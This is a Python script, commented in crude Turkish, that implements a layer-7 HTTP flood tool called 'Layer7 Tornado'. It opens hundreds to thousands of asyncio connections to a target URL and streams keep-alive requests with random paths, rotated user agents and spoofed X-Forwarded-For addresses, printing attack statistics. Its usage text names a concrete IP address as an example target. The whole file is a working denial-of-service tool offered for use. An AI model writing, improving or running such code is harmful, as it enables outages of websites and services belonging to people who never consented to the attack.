#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Layer7 Tornado - Asyncio Edition
Hiçbir sikimlik ek kurulum gerektirmez
Direkt çalışır, ananı ağlatır!
"""

import sys
import os
import time
import random
import socket
import urllib.parse
import hashlib
import asyncio
import threading
from collections import deque

# Hata yönetimini komple siktir et
sys.tracebacklimit = 0

class Layer7Asyncio:
    """
    Bu class asyncio ile ananı sikicek
    """
    
    # User-Agent list
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    def __init__(self, target, connections=1000, duration=60, method='GET', rate=100):
        """
        Parametreler:
        target: Hedef URL (http://example.com)
        connections: Paralel bağlantı sayısı (asyncio versiyon)
        duration: Saldırı süresi
        method: HTTP method
        rate: Her bağlantıdaki istek sayısı
        """
        self.target = target
        self.parsed = urllib.parse.urlparse(target)
        self.host = self.parsed.netloc.split(':')[0]
        self.port = self.parsed.port or 80
        self.connections = connections
        self.duration = duration
        self.method = method
        self.rate = rate
        
        # İstatistikler
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self.running = True
        
        # Path pool
        self.paths = [f"/{random.randint(1000,9999)}/{hashlib.md5(str(i).encode()).hexdigest()[:6]}" 
                     for i in range(100)]
        
        print(f"""
╔═══════════════════════════════════════════════════════════════╗
║           LAYER7 TORNADO - ASYNCIO EDITION v5.0              ║
║              (Bu kesin çalışır amk!)                          ║
╠═══════════════════════════════════════════════════════════════╣
║ Hedef    : {self.target[:50]:<50} ║
║ Host     : {self.host}:{self.port:<15}                        ║
║ Conn     : {self.connections:<10} | Method : {self.method:<8} ║
║ Duration : {self.duration:<10} sn | Rate   : {self.rate:<8}  ║
╚═══════════════════════════════════════════════════════════════╝
        """)
    
    def _get_request(self):
        """HTTP request oluştur - minimal PPS versiyon"""
        path = random.choice(self.paths)
        ua = random.choice(self.USER_AGENTS)
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        
        # Minimal request - en hızlı bu amk
        request = (f"{self.method} {path} HTTP/1.1\r\n"
                   f"Host: {self.host}\r\n"
                   f"User-Agent: {ua}\r\n"
                   f"X-Forwarded-For: {ip}\r\n"
                   f"Connection: keep-alive\r\n"
                   f"\r\n")
        return request.encode()
    
    async def _attack_worker(self, worker_id):
        """Asyncio worker - her worker bir bağlantı yönetir"""
        try:
            # Socket oluştur
            reader, writer = await asyncio.open_connection(self.host, self.port)
            
            # Rate kadar istek bas
            for i in range(self.rate * 100):  # 100 katı, sürekli bas
                if not self.running:
                    break
                
                try:
                    # Request gönder
                    request = self._get_request()
                    writer.write(request)
                    await writer.drain()
                    
                    # İstatistik
                    self.request_count += 1
                    self.success_count += 1
                    
                    # Her 10 istekte bir küçük mola verme - hız için kaldırdık
                    # Ama CPU'yu yakmamak için
                    if i % 1000 == 0:
                        await asyncio.sleep(0.0001)
                        
                except Exception as e:
                    self.fail_count += 1
                    break
            
            # Socket'i kapat
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.fail_count += 1
    
    async def _stats_printer(self):
        """İstatistik yazdır"""
        last_count = 0
        while self.running:
            await asyncio.sleep(1)
            current = self.request_count
            rps = current - last_count
            last_count = current
            
            elapsed = time.time() - self.start_time
            print(f"\r🔥 RPS: {rps:5d} | Toplam: {current:8d} | Başarı: {self.success_count:8d} | "
                  f"Başarısız: {self.fail_count:6d} | Süre: {elapsed:3.0f}/{self.duration}s", end='')
    
    async def _run_attack(self):
        """Asyncio saldırı başlat"""
        self.start_time = time.time()
        
        # Worker'ları oluştur
        tasks = []
        for i in range(self.connections):
            task = asyncio.create_task(self._attack_worker(i))
            tasks.append(task)
        
        # Stats task'ı
        stats_task = asyncio.create_task(self._stats_printer())
        
        # Süre boyunca çalış
        await asyncio.sleep(self.duration)
        self.running = False
        
        # Task'ları bekle
        for task in tasks:
            task.cancel()
        
        await stats_task
    
    def start(self):
        """Saldırıyı başlat"""
        print("\n🚀 Saldırı başlıyor... (CTRL+C ile durdur)\n")
        
        try:
            asyncio.run(self._run_attack())
        except KeyboardInterrupt:
            print("\n\n👋 Dur dedin durduk!")
        except Exception as e:
            print(f"\n❌ Hata: {e}")
        
        # Final istatistik
        elapsed = time.time() - self.start_time
        print(f"\n\n✅ Saldırı tamamlandı!")
        print(f"📊 Toplam istek: {self.request_count:,}")
        print(f"⚡ Ortalama RPS: {self.request_count / elapsed:.0f}")
        print(f"⏱️  Süre: {elapsed:.2f} saniye")

def main():
    """Ana fonksiyon"""
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ║
    ║     ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗ ║
    ║        ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║ ║
    ║        ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║ ║
    ║        ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝ ║
    ║        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ║
    ║                                                          ║
    ║        [ LAYER7 TORNADO - ASYNCIO EDITION ]             ║
    ║              (Çalışmazsa beni sikin!)                    ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("""

Kullanım: python3 l7.py <url> [connections] [duration] [method] [rate]

Örnek:
  python3 l7.py http://138.201.139.144/ 1000 60 GET 100
  python3 l7.py http://hedef.com 5000 30 GET 500
  
Parametreler:
  url        : Hedef URL (http://)
  connections: Paralel bağlantı (500-5000 arası)
  duration   : Saldırı süresi (saniye)
  method     : GET/POST
  rate       : Her bağlantıdaki istek sayısı
        """)
        sys.exit(1)
    
    # Parametreler
    target = sys.argv[1]
    connections = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    method = sys.argv[4].upper() if len(sys.argv) > 4 else 'GET'
    rate = int(sys.argv[5]) if len(sys.argv) > 5 else 100
    
    # URL düzelt
    if not target.startswith('http://'):
        target = 'http://' + target
    
    # Başlat
    tornado = Layer7Asyncio(
        target=target,
        connections=connections,
        duration=duration,
        method=method,
        rate=rate
    )
    
    tornado.start()

if __name__ == "__main__":
    main()
